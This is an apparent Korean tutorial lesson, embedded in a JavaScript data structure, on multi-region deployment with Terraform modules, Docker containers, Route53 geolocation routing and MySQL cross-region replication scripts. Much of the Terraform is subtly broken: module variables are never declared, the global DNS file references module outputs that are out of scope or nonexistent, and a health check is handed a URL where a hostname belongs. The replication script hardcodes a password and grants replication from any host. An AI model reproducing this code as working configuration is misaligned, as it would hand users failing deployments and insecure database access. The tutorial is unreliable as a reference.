                  content: `Terraform을 사용해 여러 리전에 동일한 인프라를 자동으로 배포합니다.

**multi-region 구조**:
\`\`\`
terraform/
├── global/
│   ├── route53.tf        # 글로벌 DNS
│   └── s3-backend.tf     # Terraform 상태 저장소
├── regions/
│   ├── ap-northeast-2/   # 서울 (Primary)
│   ├── us-west-2/        # 오리건 (DR)
│   └── ap-southeast-1/   # 싱가포르 (CDN Edge)
└── modules/
    └── app-stack/        # 재사용 가능한 앱 스택
\`\`\`

**modules/app-stack/main.tf** (재사용 모듈):
\`\`\`hcl
variable "region" {
  type = string
}

variable "environment" {
  type = string
}

# Docker 네트워크
resource "docker_network" "app" {
  name = "\${var.environment}-app-network"
}

# MySQL
resource "docker_container" "mysql" {
  name  = "\${var.environment}-mysql"
  image = "mysql:8.0"

  env = [
    "MYSQL_ROOT_PASSWORD=\${var.mysql_password}",
    "MYSQL_DATABASE=\${var.db_name}"
  ]

  # 리전별 볼륨
  volumes {
    volume_name    = "\${var.environment}-mysql-data"
    container_path = "/var/lib/mysql"
  }

  networks_advanced {
    name = docker_network.app.name
  }
}

# 웹 앱
resource "docker_container" "web" {
  name  = "\${var.environment}-web"
  image = "myapp:\${var.app_version}"

  ports {
    internal = 3000
    external = 80
  }

  networks_advanced {
    name = docker_network.app.name
  }

  depends_on = [docker_container.mysql]
}

output "web_url" {
  value = "http://\${var.region}.example.com"
}
\`\`\`

**regions/ap-northeast-2/main.tf** (서울 리전):
\`\`\`hcl
module "seoul_stack" {
  source = "../../modules/app-stack"

  region      = "ap-northeast-2"
  environment = "seoul-prod"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_seoul"
}

output "seoul_url" {
  value = module.seoul_stack.web_url
}
\`\`\`

**regions/us-west-2/main.tf** (오리건 DR):
\`\`\`hcl
module "oregon_stack" {
  source = "../../modules/app-stack"

  region      = "us-west-2"
  environment = "oregon-dr"
  app_version = "v1.2.3"
  mysql_password = var.mysql_password
  db_name     = "myapp_oregon"
}

output "oregon_url" {
  value = module.oregon_stack.web_url
}
\`\`\`

**global/route53.tf** (지리적 라우팅):
\`\`\`hcl
resource "aws_route53_zone" "main" {
  name = "example.com"
}

# 서울 리전 레코드
resource "aws_route53_record" "seoul" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Seoul"
  geolocation_routing_policy {
    continent = "AS"
  }

  records = [module.seoul_stack.public_ip]
}

# 오리건 리전 레코드
resource "aws_route53_record" "oregon" {
  zone_id = aws_route53_zone.main.zone_id
  name    = "app.example.com"
  type    = "A"
  ttl     = 60

  set_identifier = "Oregon"
  geolocation_routing_policy {
    continent = "NA"
  }

  records = [module.oregon_stack.public_ip]

  # Health Check 연동
  health_check_id = aws_route53_health_check.oregon.id
}

# Health Check
resource "aws_route53_health_check" "oregon" {
  fqdn              = module.oregon_stack.web_url
  port              = 80
  type              = "HTTP"
  resource_path     = "/health"
  failure_threshold = 3
  request_interval  = 30

  tags = {
    Name = "Oregon Health Check"
  }
}
\`\`\`

**전체 리전 배포 스크립트**:
\`\`\`bash
#!/bin/bash
# deploy-all-regions.sh

REGIONS=("ap-northeast-2" "us-west-2" "ap-southeast-1")

for REGION in "\${REGIONS[@]}"; do
  echo "🌏 Deploying to \$REGION..."

  cd regions/\$REGION
  terraform init
  terraform apply -auto-approve -var-file=../../environments/prod.tfvars

  # Health Check
  HEALTH_URL=\$(terraform output -raw web_url)/health
  curl -f \$HEALTH_URL || echo "⚠️  \$REGION health check failed!"

  cd ../..
done

# 글로벌 DNS 업데이트
echo "🌐 Updating global DNS..."
cd global
terraform init
terraform apply -auto-approve

echo "✅ Multi-region deployment completed!"
\`\`\`

**데이터베이스 복제 (Primary → DR)**:
\`\`\`bash
#!/bin/bash
# db-replication.sh - 서울 → 오리건 실시간 복제

PRIMARY_DB="seoul-mysql"
DR_DB="oregon-mysql"

# Binary Log 기반 복제 설정
docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CREATE USER 'repl'@'%' IDENTIFIED BY 'repl_password';
  GRANT REPLICATION SLAVE ON *.* TO 'repl'@'%';
  FLUSH PRIVILEGES;
  SHOW MASTER STATUS;
"

# DR에서 복제 시작
MASTER_LOG_FILE=\$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $1}')
MASTER_LOG_POS=\$(docker exec \${PRIMARY_DB} mysql -u root -p\${MYSQL_PASSWORD} -se "SHOW MASTER STATUS" | awk '{print $2}')

docker exec \${DR_DB} mysql -u root -p\${MYSQL_PASSWORD} -e "
  CHANGE MASTER TO
    MASTER_HOST='primary-server.example.com',
    MASTER_USER='repl',
    MASTER_PASSWORD='repl_password',
    MASTER_LOG_FILE='\${MASTER_LOG_FILE}',
    MASTER_LOG_POS=\${MASTER_LOG_POS};
  START SLAVE;
  SHOW SLAVE STATUS\\G;
"

echo "✅ Cross-region replication configured!"
\`\`\``,
                  checklist: [
                    "modules/app-stack/ 디렉토리에 재사용 가능한 모듈 작성",
                    "3개 리전(서울/오리건/싱가포르)에 각각 스택 배포",
                    "Route53에서 Geolocation 라우팅 설정 (아시아→서울, 미국→오리건)",
                    "db-replication.sh로 서울→오리건 DB 실시간 복제 설정",
                    "VPN으로 미국 IP 사용해서 오리건 서버로 라우팅되는지 확인"
                  ]
                }
              ]
            }
          }
        }
      ]
    }
  ]
};
